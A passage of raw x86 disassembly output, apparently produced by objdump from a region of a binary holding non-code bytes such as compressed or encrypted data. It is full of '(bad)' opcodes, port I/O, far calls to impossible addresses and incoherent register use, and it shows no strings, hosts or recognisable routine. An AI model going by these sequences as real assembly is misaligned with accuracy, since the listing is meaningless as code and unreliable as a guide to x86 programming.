  414495:	outs   dx,BYTE PTR ds:[esi]
  414496:	mov    cs,WORD PTR [esi-0x463c368d]
  41449c:	hlt    
  41449d:	loop   0x4144e4
  41449f:	fs out dx,al
  4144a1:	or     edx,DWORD PTR fs:[ebp+0x62]
  4144a5:	dec    esi
  4144a6:	ins    DWORD PTR es:[edi],dx
  4144a7:	inc    esi
  4144a8:	inc    ecx
  4144a9:	enter  0xe142,0x61
  4144ad:	imul   esi,edx,0x6c9bfc22
  4144b3:	addr16 das 
  4144b5:	sahf   
  4144b6:	adc    esp,DWORD PTR [esi+0x3c808895]
  4144bc:	fimul  WORD PTR [ecx+0x1b96f1ce]
  4144c2:	or     DWORD PTR [ebp-0x2f],0xffffffe1
  4144c6:	cmp    eax,0xc0fe7b3a
  4144cb:	(bad)  
  4144cc:	dec    ebp
  4144cd:	xchg   edx,eax
  4144ce:	mov    ch,0x14
  4144d0:	cmp    ebp,esi
  4144d2:	pop    esp
  4144d3:	push   edi
  4144d4:	fwait
  4144d5:	mov    edi,ecx
  4144d7:	add    al,0xbf
  4144d9:	mov    DWORD PTR [ebx+0x72],esp
  4144dc:	bound  esi,QWORD PTR [ebx+0x4a]
  4144df:	and    esp,0xf39fb6ea
  4144e5:	jmp    0x62cd7c87
  4144ea:	sub    al,0x5
  4144ec:	psubsb mm7,mm1
  4144ef:	xor    eax,DWORD PTR [eax-0x36]
  4144f2:	inc    ebx
  4144f3:	fsubr  QWORD PTR [ebp+0xb6687dd]
  4144f9:	fst    st(4)
  4144fb:	pop    ebp
  4144fc:	pop    edi
  4144fd:	test   eax,0x86d148b4
  414502:	arpl   WORD PTR [ecx+0x62694e53],di
  414508:	cmc    
  414509:	dec    esp
  41450a:	dec    esp
  41450b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41450c:	mov    esi,0x5d326208
  414511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414512:	xchg   esp,eax
  414513:	jae    0x414518
  414515:	scas   eax,DWORD PTR es:[edi]
  414516:	pusha  
  414517:	xchg   ebx,eax
  414518:	push   ecx
  414519:	push   cs
  41451a:	arpl   WORD PTR [esp+edx*1+0x33188410],di
  414521:	out    0x99,eax
  414523:	xor    edi,DWORD PTR [eax-0x7c]
  414526:	in     al,0x96
  414528:	out    dx,al
  414529:	sbb    DWORD PTR [ecx],esi
  41452b:	clc    
  41452c:	dec    ebp
  41452d:	mov    eax,0x89ba0318
  414532:	mov    esp,DWORD PTR [ecx-0x39]
  414535:	mov    ebp,0x7fb54bb0
  41453a:	jge    0x4145a1
  41453c:	mov    ecx,DWORD PTR [ebp-0x77]
  41453f:	lahf   
  414540:	rcl    BYTE PTR [eax-0x40],1
  414543:	and    al,bl
  414545:	cmp    esp,DWORD PTR [edx+0x1]
  414548:	pop    edi
  414549:	adc    eax,0xdd1da82a
  41454e:	rcl    BYTE PTR [edx+0x4d],1
  414551:	mov    dl,0x54
  414553:	xchg   ebp,eax
  414554:	and    DWORD PTR [eax+ebx*4-0x39],esi
  414558:	fcomi  st,st(1)
  41455a:	imul   ebx,ebx,0xfffffff8
  41455d:	adc    bh,BYTE PTR [edx]
  41455f:	aad    0x55
  414561:	sub    al,0x27
  414563:	(bad)  
  414564:	daa    
  414565:	inc    esp
  414566:	call   0xf41f:0x101c6417
  41456d:	xchg   ebp,eax
  41456e:	es cmp edx,edi
  414571:	sbb    ch,dl
  414573:	jno    0x41454f
  414575:	mov    ds:0xed729764,al
  41457a:	call   0x8d365aba
  41457f:	cmp    DWORD PTR [ebx],eax
  414581:	or     eax,0xb7f46bf9
  414586:	dec    ecx
  414587:	fmul   DWORD PTR [esi]
  414589:	(bad)  
  41458a:	loop   0x414561
  41458c:	lds    ebx,FWORD PTR [ebx-0x1bc9727a]
  414592:	(bad)  
  414593:	loopne 0x41457a
  414595:	aam    0x90
  414597:	jb     0x41455c
  414599:	sub    esi,DWORD PTR [eax+0x1e]
  41459c:	(bad)  
  41459d:	hlt    
  41459e:	fld    DWORD PTR [edi+edi*2+0x6a]
  4145a2:	dec    edi
  4145a3:	xlat   BYTE PTR ds:[ebx]
  4145a5:	sub    BYTE PTR [ebp-0x1f748312],ah
  4145ab:	jmp    0xcaee1752
  4145b0:	jb     0x4145b1
  4145b2:	or     bl,dl
  4145b4:	das    
  4145b5:	xor    BYTE PTR [eax-0x1c9ce62],0xe8
  4145bc:	iret   
  4145bd:	lods   al,BYTE PTR ds:[esi]
  4145be:	jle    0x41463e
  4145c0:	sub    DWORD PTR [edx-0x56],esp
  4145c3:	pop    ecx
  4145c4:	out    dx,al
  4145c5:	jl     0x414616
  4145c7:	xchg   ebx,eax
  4145c8:	sub    ecx,DWORD PTR [eax+ebp*2-0x362c4a5e]
  4145cf:	adc    DWORD PTR [eax-0x4d77a781],esi
  4145d5:	and    BYTE PTR [edi-0x4fe522c5],cl
  4145db:	inc    eax
  4145dc:	loop   0x414560
  4145de:	xchg   ebp,eax
  4145df:	outs   dx,DWORD PTR ds:[esi]
  4145e0:	(bad)  
  4145e1:	in     al,dx
  4145e2:	sar    bh,1
  4145e4:	add    esi,DWORD PTR [esi]
  4145e6:	mov    ds:0x9a57ab7d,al
  4145eb:	je     0x4145c4
  4145ed:	add    bh,BYTE PTR [edi-0x9]
  4145f0:	mov    edi,0x2acb7b5b
  4145f5:	pop    ebx
  4145f6:	mov    esi,0x1c2b9568
  4145fb:	scas   al,BYTE PTR es:[edi]
  4145fc:	mov    esi,0x5e9c63ad
  414601:	inc    edx
  414602:	sbb    BYTE PTR [eax+ecx*8],dh
  414605:	xlat   BYTE PTR ds:[ebx]
  414606:	nop
  414607:	jnp    0x4145c4
  414609:	stos   DWORD PTR es:[edi],eax
  41460a:	hlt    
  41460b:	test   al,0x8f
  41460d:	cmc    
  41460e:	dec    edx
  41460f:	out    dx,eax
  414610:	mov    bh,0x2
  414612:	xor    bh,BYTE PTR [esi+ebx*4+0x24]
  414616:	in     al,dx
  414617:	xchg   edx,eax
  414618:	in     al,dx
  414619:	mov    WORD PTR [edi+0x3d0a404a],gs
  41461f:	and    BYTE PTR [eax],dl
  414621:	jge    0x414616
  414623:	out    0xae,al
  414625:	aad    0x3c
  414627:	xchg   edi,eax
  414628:	xor    dh,BYTE PTR [esi-0xb1a4038]
  41462e:	fnsave [edx+0xd]
  414631:	inc    eax
  414632:	js     0x414665
  414634:	lea    ebx,[ebx-0x29]
  414637:	mov    al,0x98
  414639:	mov    al,0x6d
  41463b:	inc    esp
  41463c:	aas    
  41463d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41463e:	cmp    dl,BYTE PTR [ecx-0x80]
  414641:	push   es
  414642:	cmp    ebp,DWORD PTR [ebp+0x42]
  414645:	outs   dx,BYTE PTR ds:[esi]
  414646:	cmp    BYTE PTR [edx+0x62],bh
  414649:	leave  
  41464a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464b:	inc    edx
  41464c:	push   edi
  41464d:	mov    esp,0xd409ccbb
  414652:	cmp    eax,0x153763a4
  414657:	mov    ch,0x68
  414659:	ror    DWORD PTR [ecx],cl
  41465b:	mov    di,cs
  41465e:	xchg   BYTE PTR ss:[edx-0x4e56aaa0],ch
  414665:	sub    eax,0x2b64cd4a
  41466a:	aam    0x7e
  41466c:	mov    bh,0x9c
  41466e:	call   0x5eccd35
  414673:	sbb    edx,edi
  414675:	xor    al,0xc
  414677:	aaa    
  414678:	popa   
  414679:	pop    ds
  41467a:	xchg   ebx,eax
  41467b:	jb     0x414681
  41467d:	in     eax,0xf9
  41467f:	outs   dx,BYTE PTR ds:[esi]
  414680:	inc    eax
  414681:	call   FWORD PTR [eax-0x54]
  414684:	sbb    edi,edi
  414686:	mov    es,WORD PTR [esi+ebp*8-0x2]
  41468a:	adc    cl,bl
  41468c:	or     cl,dh
  41468e:	fnstcw WORD PTR [eax+0x6779fd62]
  414694:	out    0xff,eax
  414696:	mov    esi,0xb2b30038
  41469b:	pushf  
  41469c:	mov    esi,DWORD PTR [eax-0x3c]
  41469f:	ins    DWORD PTR es:[edi],dx
  4146a0:	mov    eax,0x86eb1ae1
  4146a5:	cmp    bh,0xce
  4146a8:	mov    bl,BYTE PTR [ecx]
  4146aa:	lods   eax,DWORD PTR ds:[esi]
  4146ab:	xchg   DWORD PTR [ebx-0x6515f894],ecx
  4146b1:	push   cs
  4146b2:	outs   dx,BYTE PTR ds:[esi]
  4146b3:	ins    DWORD PTR es:[edi],dx
  4146b4:	in     al,0x8d
  4146b6:	jbe    0x4146b9
  4146b8:	inc    eax
  4146b9:	loop   0x41467f
  4146bb:	stc    
  4146bc:	xchg   ebx,eax
  4146bd:	jge    0x4146ed
  4146bf:	push   ds
  4146c0:	jmp    0x414718
  4146c2:	push   edi
  4146c3:	jbe    0x414677
  4146c5:	popa   
  4146c6:	mov    edx,0xf9f4e8e6
  4146cb:	adc    eax,ebx
  4146cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ce:	fbstp  TBYTE PTR [ecx-0x5464aee3]
  4146d4:	add    eax,0x7d332322
  4146d9:	inc    ebp
  4146da:	cmp    bl,BYTE PTR [edx+eax*8]
  4146dd:	clc    
  4146de:	pop    ebp
  4146df:	leave  
  4146e0:	js     0x4146ed
  4146e2:	lods   al,BYTE PTR ds:[esi]
  4146e3:	cmc    
  4146e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146e5:	test   BYTE PTR [ebx+0x72270bcf],dh
  4146eb:	clc    
  4146ec:	ds jmp 0xa96f:0x8430ae1e
  4146f4:	ins    BYTE PTR es:[edi],dx
  4146f5:	adc    al,0x79
  4146f7:	js     0x414734
  4146f9:	and    esp,esp
  4146fb:	stc    
  4146fc:	js     0x414701
  4146fe:	cmc    
  4146ff:	aas    
  414700:	cmp    esi,DWORD PTR [edi]
  414702:	outs   dx,BYTE PTR ds:[esi]
  414703:	push   edi
  414704:	cmp    ebx,edx
  414706:	push   ds
  414707:	sahf   
  414708:	inc    ebp
  414709:	and    dh,BYTE PTR [edx]
  41470b:	rol    bl,cl
  41470d:	fwait
  41470e:	dec    BYTE PTR [esi-0x3688a781]
  414714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414715:	pop    edi
  414716:	dec    ebx
  414717:	add    al,0xab
  414719:	jae    0x4146e9
  41471b:	jns    0x414709
  41471d:	into   
  41471e:	mov    eax,0x2fd16e02
  414723:	iret   
  414724:	out    dx,eax
  414725:	or     eax,0x9331399d
  41472a:	inc    ecx
  41472b:	and    eax,0x96feab9d
  414730:	iret   
  414731:	test   DWORD PTR [ecx+0x5c082002],esp
  414737:	or     al,0x90
  414739:	inc    edi
  41473a:	retf   0xacfe
  41473d:	test   eax,0x9f0e0af9
  414742:	inc    esi
  414743:	in     al,dx
  414744:	stos   DWORD PTR es:[edi],eax
  414745:	popa   
  414746:	xchg   edx,eax
  414747:	popf   
  414748:	dec    ecx
  414749:	stos   BYTE PTR es:[edi],al
  41474a:	add    BYTE PTR [edi],bh
  41474c:	in     al,dx
  41474d:	adc    eax,0xb8e974c6
  414752:	sahf   
  414753:	and    al,0xf3
  414755:	mov    dl,0xc3
  414757:	xor    bh,dh
  414759:	into   
  41475a:	in     al,0x68
  41475c:	xchg   ebx,eax
  41475d:	stc    
  41475e:	out    0x1e,eax
  414760:	sbb    ecx,DWORD PTR [eax-0x38]
  414763:	int    0x54
  414765:	fwait
  414766:	jbe    0x4147d2
  414768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414769:	pop    esp
  41476a:	jg     0x4147dc
  41476c:	pop    es
  41476d:	popf   
  41476e:	jl     0x414773
  414770:	add    eax,0x1ed54851
  414775:	push   ebx
  414776:	nop
  414777:	or     al,0xa0
  414779:	push   ss
  41477a:	ret    
  41477b:	(bad)  
  41477c:	mov    dh,dh
  41477e:	jns    0x4147c7
  414780:	dec    eax
  414781:	sub    DWORD PTR [edx],esi
  414783:	(bad)  
  414784:	(bad)  
  414786:	add    BYTE PTR [ecx-0x60cc5c7],cl
  41478c:	pop    esp
  41478d:	jns    0x41473a
  41478f:	xlat   BYTE PTR ds:[ebx]
  414790:	out    dx,eax
  414791:	shr    bh,1
  414793:	or     eax,0xf597a5db
  414798:	mov    edx,0x5b7b52da
  41479d:	xor    eax,0xfeb6c475
  4147a2:	fcmove st,st(6)
  4147a4:	cwde   
  4147a5:	add    eax,0xbaa5691f
  4147aa:	or     al,0xbe
  4147ac:	les    ebx,FWORD PTR [eax]
  4147ae:	dec    edx
  4147af:	pop    ebx
  4147b0:	mov    gs,WORD PTR [edi+0x7f]
  4147b3:	sbb    eax,0x273b4de
  4147b8:	fldenv [esp+ecx*4]
  4147bb:	daa    
  4147bc:	add    al,0x8c
  4147be:	das    
  4147bf:	test   al,0x35
  4147c1:	lods   al,BYTE PTR ds:[esi]
  4147c2:	xchg   edx,eax
  4147c3:	inc    ecx
  4147c4:	inc    ebp
  4147c5:	jle    0x4147ec
  4147c7:	ja     0x4147c9
  4147c9:	cs loopne 0x414773
  4147cc:	mov    fs,WORD PTR [edi+0x2bba0112]
  4147d2:	mov    esp,0xcf8667f5
  4147d7:	xor    eax,0xc56cb936
  4147dc:	mov    ebp,0x1518f5e7
  4147e1:	ret    0x3a91
  4147e4:	dec    ebp
  4147e5:	sbb    al,bh
  4147e7:	sub    DWORD PTR [esi],eax
  4147e9:	dec    ebp
  4147ea:	and    ebx,DWORD PTR [esi+0xfdae1f7]
  4147f0:	add    al,0xf0
  4147f2:	xor    DWORD PTR [ecx+0x285a1947],eax
  4147f8:	test   eax,0x8534da91
  4147fd:	jecxz  0x414835
  4147ff:	addr16 inc edx
  414801:	adc    BYTE PTR ds:0xc9be1859,dl
  414807:	dec    ebx
  414808:	outs   dx,BYTE PTR ds:[esi]
  414809:	fcom   DWORD PTR [edi-0x6e]
  41480c:	mov    eax,0xb87790c2
  414811:	pop    ds
  414812:	(bad)  [ebp+0x30]
  414815:	les    esi,FWORD PTR [ebx]
  414817:	mov    ds:0x7f02b607,eax
  41481c:	push   ebp
  41481d:	jns    0x41483d
  41481f:	aam    0x6b
  414821:	inc    esp
  414822:	sbb    DWORD PTR [ecx+edx*4-0x7e8affdd],ebp
  414829:	jo     0x414858
  41482b:	inc    ebx
  41482c:	push   edi
  41482d:	pusha  
  41482e:	mov    ecx,0xd2b574e5
  414833:	fs push edi
  414835:	adc    eax,DWORD PTR [ebx+0x15]
  414838:	push   ebp
  414839:	sub    ch,BYTE PTR [edi+0x6a]
  41483c:	jnp    0x41481b
  41483e:	push   0xfffffff9
  414840:	dec    esi
  414841:	cli    
  414842:	in     eax,0xe8
  414844:	xchg   ebp,eax
  414845:	shl    BYTE PTR [esi],1
  414847:	add    al,0x9a
  414849:	sbb    edx,DWORD PTR [esi]
  41484b:	ins    DWORD PTR es:[edi],dx
  41484c:	adc    BYTE PTR [eax],ah
  41484e:	scas   al,BYTE PTR es:[edi]
  41484f:	push   ebp
  414850:	out    dx,al
  414851:	adc    DWORD PTR [edx],ecx
  414853:	ret    
  414854:	push   ss
  414855:	popa   
  414856:	jae    0x414860
  414858:	pusha  
  414859:	imul   edx,DWORD PTR [ebx],0xffffffaa
  41485c:	scas   eax,DWORD PTR es:[edi]
  41485d:	or     eax,0x34891649
  414862:	lods   al,BYTE PTR ds:[esi]
  414863:	add    DWORD PTR [ecx],0xf5dac7a6
  414869:	mov    al,0x62
  41486b:	push   ds
  41486c:	sub    eax,0xca67812c
  414871:	cwde   
  414872:	retf   0xc172
  414875:	shl    bl,0x30
  414878:	push   esp
  414879:	(bad)  
  41487a:	lock test cl,0xbd
  41487e:	mov    ebx,0x6c521a04
  414883:	ss pop eax
  414885:	jne    0x4148bd
  414887:	jp     0x4148ec
  414889:	les    ecx,FWORD PTR [eax]
  41488b:	sbb    BYTE PTR [edi],bl
  41488d:	das    
  41488e:	mov    esp,0xe8304f88
  414893:	call   0xa2e9:0x184e096b
  41489a:	pop    esp
  41489b:	mov    cl,0xfe
  41489d:	inc    ecx
  41489e:	mov    eax,ds:0xcc666c72
  4148a3:	dec    esi
  4148a4:	push   0xffffff98
  4148a6:	mov    BYTE PTR [esi-0x73f11fff],0xa6
  4148ad:	adc    ch,bl
  4148af:	loopne 0x4148d1
  4148b1:	inc    ebp
  4148b2:	shl    bl,1
  4148b4:	(bad)  [esi-0x1a]
  4148b7:	push   eax
  4148b8:	xor    DWORD PTR [ecx-0x4a],esi
  4148bb:	adc    ecx,DWORD PTR [ebp-0x6]
  4148be:	inc    bl
  4148c0:	adc    eax,0xb0585896
  4148c5:	or     BYTE PTR [esi-0x23],cl
  4148c8:	push   edx
  4148c9:	retf   0x6331
  4148cc:	pop    esi
  4148cd:	shl    BYTE PTR [ecx],cl
  4148cf:	call   0x8824:0x192d6924
  4148d6:	mov    cs,WORD PTR [esi+0x4c]
  4148d9:	push   cs
  4148da:	pop    edx
  4148db:	rol    BYTE PTR [ecx-0x4bc7bd8b],1
  4148e1:	adc    dl,bh
  4148e3:	shl    BYTE PTR [eax+0x4b],1
  4148e6:	addr16 pop ebx
  4148e8:	xor    eax,0x5f165edb
  4148ed:	jmp    DWORD PTR ds:0xdb2565cb
  4148f3:	cmp    ah,BYTE PTR [edi+0x4f947263]
  4148f9:	jae    0x414936
  4148fb:	pop    edi
  4148fc:	dec    edi
  4148fd:	retf   0x75c0
  414900:	add    DWORD PTR [esi+0x7e852e64],0x70a1a395
  41490a:	daa    
  41490b:	jp     0x4148de
  41490d:	dec    ecx
  41490e:	adc    eax,0x19774690
  414913:	mov    ebp,0x2df5118b
  414918:	repz in eax,dx
  41491a:	mov    dh,0x60
  41491c:	jnp    0x414906
  41491e:	setp   BYTE PTR [edi+0x3c098836]
  414925:	mov    ebx,0xa4374dab
  41492a:	sbb    al,0x18
  41492c:	jmp    0x88badcf5
  414931:	jo     0x41492a
  414933:	into   
  414934:	cmp    eax,0x2549127b
  414939:	(bad)  
  41493a:	push   esi
  41493b:	icebp  
  41493c:	jne    0x4148ff
  41493e:	mov    edx,0x5854798c
  414943:	ret    0xecb
  414946:	(bad)  
  414947:	push   ds
  414948:	cmp    ebp,DWORD PTR [eax-0x62]
  41494b:	pop    es
  41494c:	fnstenv [ecx]
  41494e:	jo     0x414998
  414950:	es or  al,0x45
  414953:	inc    esi
  414954:	iret   
  414955:	adc    eax,0x66caf65b
  41495a:	push   ds
  41495b:	loope  0x414987
  41495d:	adc    DWORD PTR [esi],eax
  41495f:	adc    BYTE PTR [ecx-0x73c6c06c],ch
  414965:	shr    esi,1
  414967:	sti    
  414968:	sub    BYTE PTR [eax-0x10],dh
  41496b:	xchg   esp,eax
  41496c:	mov    ah,0xd0
  41496e:	(bad)  
  41496f:	outs   dx,DWORD PTR ds:[esi]
  414970:	mov    dl,0x5e
  414972:	xor    DWORD PTR [edx],ebp
  414974:	mov    cl,0x81
  414976:	xor    al,0x33
  414978:	add    eax,0xb80cab91
  41497d:	hlt    
  41497e:	fwait
  41497f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414980:	push   es
  414981:	jmp    0x21b5e793
  414986:	jb     0x4149ef
  414988:	mov    edx,0x3d3e6214
  41498d:	push   ds
  41498e:	lods   eax,DWORD PTR ds:[esi]
  41498f:	ins    BYTE PTR es:[edi],dx
  414990:	call   0x7e56:0x7dc45cbb
  414997:	les    edx,FWORD PTR [ecx]
  414999:	repnz int3 
  41499b:	aaa    
  41499c:	or     dl,BYTE PTR [ecx-0x4e8b1440]
  4149a2:	stos   DWORD PTR es:[edi],eax
  4149a3:	xor    DWORD PTR [edi],0xffffff8d
  4149a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149a7:	ins    DWORD PTR es:[edi],dx
  4149a8:	push   0x4a4670be
  4149ad:	hlt    
  4149ae:	das    
  4149af:	pop    esi
  4149b0:	lods   al,BYTE PTR ds:[esi]
  4149b1:	pusha  
  4149b2:	fs (bad) 
  4149b4:	cs jno 0x4149f3
  4149b7:	lea    edi,[ecx]
  4149b9:	sbb    BYTE PTR [edi],ch
  4149bb:	xchg   ebx,eax
  4149bc:	pop    es
  4149bd:	popf   
  4149be:	xor    eax,edi
  4149c0:	loopne 0x41495c
  4149c2:	jne    0x4149eb
  4149c4:	jmp    0xfe0b0d32
  4149c9:	adc    dl,BYTE PTR [esp+esi*2+0x659366d1]
  4149d0:	dec    ebp
  4149d1:	outs   dx,DWORD PTR ds:[esi]
  4149d2:	ins    BYTE PTR es:[edi],dx
  4149d3:	ret    0xa89c
  4149d6:	fsubr  DWORD PTR [ecx-0xc]
  4149d9:	stos   BYTE PTR es:[edi],al
  4149da:	pop    ss
  4149db:	popa   
  4149dc:	sbb    DWORD PTR [esi+0x11],ebp
  4149df:	push   ecx
  4149e0:	pushf  
  4149e1:	js     0x4149f6
  4149e3:	add    DWORD PTR [edi-0x18],esi
  4149e6:	popf   
  4149e7:	cld    
  4149e8:	nop
  4149e9:	add    cl,al
  4149eb:	in     al,dx
  4149ec:	inc    ebx
  4149ed:	cmc    
  4149ee:	aam    0xc8
  4149f0:	push   esp
  4149f1:	iret   
  4149f2:	or     eax,0x45fbdfa7
  4149f7:	ret    0x71f7
  4149fa:	cmp    bh,BYTE PTR [edx+0x9]
  4149fd:	mul    BYTE PTR [esi-0x6e]
  414a00:	cmp    eax,0x8570687d
  414a05:	out    dx,eax
  414a06:	(bad)  
  414a07:	fld    DWORD PTR [ebx+0x260e06c1]
  414a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a0e:	out    0x3e,eax
  414a10:	fsubr  DWORD PTR [ebp-0x1a]
  414a13:	jae    0x414a4b
  414a15:	mov    esp,0x63c025cf
  414a1a:	icebp  
  414a1b:	dec    edi
  414a1c:	xor    DWORD PTR cs:[edi],esi
  414a1f:	push   0x5e
  414a21:	addr16 pop ebx
  414a23:	enter  0x8fb7,0x13
  414a27:	pop    ebx
  414a28:	(bad)  
  414a29:	hlt    
  414a2a:	ja     0x4149cd
  414a2c:	das    
  414a2d:	push   0xffffffe1
  414a2f:	call   0x7b86:0x51036f96
  414a36:	(bad)  
  414a37:	imul   esp,DWORD PTR [ebx],0xa1d36f6d
  414a3d:	rol    ch,cl
  414a3f:	popa   
  414a40:	popf   
  414a41:	mov    WORD PTR [edx-0x79000af],es
  414a47:	add    al,0xae
  414a49:	mov    ecx,0xfacb4c78
  414a4e:	aam    0x70
  414a50:	pop    ds
  414a51:	sub    BYTE PTR [edx-0x609ea978],ah
  414a57:	out    dx,eax
  414a58:	and    dl,dh
  414a5a:	jnp    0x4149dd
  414a5c:	mov    ebx,0xe325fbc6
  414a61:	aas    
  414a62:	pushf  
  414a63:	mov    DWORD PTR [edx+eiz*4],eax
  414a66:	push   esi
  414a67:	scas   al,BYTE PTR es:[edi]
  414a68:	mov    esp,0xc61d01b3
  414a6d:	dec    edi
  414a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a6f:	xchg   DWORD PTR [ebp-0x7435d205],edi
  414a75:	push   ebp
  414a76:	in     al,0x33
  414a78:	(bad)  
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	fiadd  WORD PTR [edi+0x47ef536a]
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx+0x13]
  414a97:	clc    
  414a98:	cmp    BYTE PTR [esi-0x5cefed5f],0xca
  414a9f:	push   cs
  414aa0:	xchg   edx,eax
  414aa1:	je     0x414ae1
  414aa3:	xor    cl,BYTE PTR [ebx+0x41cd0191]
  414aa9:	fbld   TBYTE PTR [esi+esi*1]
  414aac:	jp     0x414aa1
  414aae:	jmp    0x4d7ac950
  414ab3:	jl     0x414a93
  414ab5:	push   eax
  414ab6:	aam    0x92
  414ab8:	sub    BYTE PTR [esi+0x38],0xbf
  414abc:	sub    BYTE PTR [edx],ah
  414abe:	add    DWORD PTR [ebx+0x439751d2],esi
  414ac4:	nop
  414ac5:	lock jl 0x414ad5
  414ac8:	jmp    0x414aaa
  414aca:	mov    al,ds:0x20e56e6a
  414acf:	push   ecx
  414ad0:	jns    0x414af3
  414ad2:	dec    ecx
  414ad3:	out    dx,al
  414ad4:	fstp   st(0)
  414ad6:	adc    DWORD PTR [ebp+eiz*4+0x6f],esp
  414ada:	imul   ebp,edi,0xffffff81
  414add:	add    BYTE PTR [esi],ah
  414adf:	cmp    ah,BYTE PTR [edx]
  414ae1:	xor    BYTE PTR [edx+0x269971b8],bh
  414ae7:	push   ss
  414ae8:	sahf   
  414ae9:	inc    esp
  414aea:	pop    edi
  414aeb:	sahf   
  414aec:	lods   eax,DWORD PTR ds:[esi]
  414aed:	inc    esp
  414aee:	fdiv   DWORD PTR es:[ebp-0x483ce05a]
  414af5:	lods   eax,DWORD PTR ds:[esi]
  414af6:	ret    
  414af7:	fcmovnbe st,st(6)
  414af9:	pusha  
  414afa:	fstp   DWORD PTR [edx-0x7a]
  414afd:	jno    0x414aec
  414aff:	dec    ebx
  414b00:	dec    ebx
  414b01:	lahf   
  414b02:	adc    eax,0x4369895c
  414b07:	dec    eax
  414b08:	inc    ecx
  414b09:	gs int3 
  414b0b:	rcl    DWORD PTR [ecx-0x7df476a5],1
  414b11:	idiv   DWORD PTR [ebx]
  414b13:	cmp    dl,bh
  414b15:	jg     0x414b8d
  414b17:	inc    ebp
  414b18:	sti    
  414b19:	out    0x5f,eax
  414b1b:	mov    bl,0x8f
  414b1d:	jl     0x414ad1
  414b1f:	adc    eax,ecx
  414b21:	mov    ds:0x8a4f8087,eax
  414b26:	xor    esi,DWORD PTR [edi]
  414b28:	not    BYTE PTR [edx+0x1d28ffe9]
  414b2e:	loope  0x414b1c
  414b30:	ds scas al,BYTE PTR es:[di]
  414b33:	out    0x59,al
  414b35:	pop    esi
  414b36:	int3   
  414b37:	sbb    eax,0x58872a6f
  414b3c:	cwde   
  414b3d:	sub    DWORD PTR [esi+0x64b8f8bf],ecx
  414b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b44:	cmp    dl,0xb
  414b47:	lods   al,BYTE PTR ds:[esi]
  414b48:	popf   
  414b49:	aas    
  414b4a:	retf   
  414b4b:	inc    ebx
  414b4c:	jo     0x414b01
  414b4e:	jb     0x414ae3
  414b50:	mov    al,ds:0x8980bea1
  414b55:	ins    BYTE PTR es:[edi],dx
  414b56:	add    ecx,DWORD PTR [edi-0xe2dd60]
  414b5c:	or     DWORD PTR [eax+0x1c],ebp
  414b5f:	add    al,0xbb
  414b61:	or     BYTE PTR [ebp-0x72293709],al
  414b67:	cmp    DWORD PTR [ebp+esi*4-0x49008092],esi
  414b6e:	or     eax,DWORD PTR [ebp-0x2d8ee57a]
  414b74:	mov    esp,0x39eb19e8
  414b79:	jg     0x414b8e
  414b7b:	fwait
  414b7c:	jmp    0x414b66
  414b7e:	test   bh,ah
  414b80:	and    al,0xb1
  414b82:	push   0xe7b668e5
  414b87:	aad    0x1c
  414b89:	outs   dx,DWORD PTR ds:[esi]
  414b8a:	push   eax
  414b8b:	mov    ?,esp
  414b8d:	call   0xc481:0x2804a821
  414b94:	add    al,BYTE PTR [edx+0x49]
  414b97:	dec    eax
  414b98:	fsubr  QWORD PTR [edi-0x40d80fd8]
  414b9e:	fistp  WORD PTR [ebx-0x464a4e2c]
  414ba4:	dec    ebx
  414ba5:	adc    bl,BYTE PTR [esi-0x38]
  414ba8:	leave  
  414ba9:	dec    esp
  414baa:	dec    esi
  414bab:	outs   dx,DWORD PTR ds:[esi]
  414bac:	jp     0x414c19
  414bae:	sbb    eax,ecx
  414bb0:	test   al,0x5d
  414bb2:	fcomp  DWORD PTR [eax-0x16]
  414bb5:	jmp    0x99068296
  414bba:	mov    eax,ds:0xacbea629
  414bbf:	push   0x85238e21
  414bc4:	add    edx,eax
  414bc6:	(bad)  
  414bc7:	inc    edx
  414bc8:	inc    bl
  414bca:	out    dx,eax
  414bcb:	mov    edx,0xfe452cd0
  414bd0:	cmp    BYTE PTR [edx],0xc5
  414bd3:	(bad)  
  414bd5:	adc    ch,BYTE PTR [edx]
  414bd7:	daa    
  414bd8:	into   
  414bd9:	cdq    
  414bda:	dec    edi
  414bdb:	bound  ebp,QWORD PTR [ebp-0x32ec7064]
  414be1:	mov    cl,0x99
  414be3:	add    al,0xb
  414be5:	mov    eax,0x929ff03a
  414bea:	ficomp WORD PTR [ebp+0x543cc92a]
  414bf0:	xor    edx,DWORD PTR [ebx]
  414bf2:	sbb    eax,0xb4a355d5
  414bf7:	ds aas 
  414bf9:	jb     0x414be4
  414bfb:	mov    ch,0x3
  414bfd:	shr    DWORD PTR [bx+si],cl
  414c00:	push   ds
  414c01:	cmp    eax,0x356811c4
  414c06:	xchg   BYTE PTR [eax],dh
  414c08:	test   BYTE PTR [ebp+0x53ed0221],0xc0
  414c0f:	into   
  414c10:	push   es
  414c11:	mov    ecx,0x6573f81
  414c16:	mov    al,ds:0x91c393e7
  414c1b:	and    DWORD PTR [edi-0x47b5fabb],edi
  414c21:	dec    esi
  414c22:	xlat   BYTE PTR ds:[ebx]
  414c23:	sub    edx,DWORD PTR [edi]
  414c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c26:	mov    eax,0x68047f5d
  414c2b:	dec    esi
  414c2c:	mov    dl,0xd3
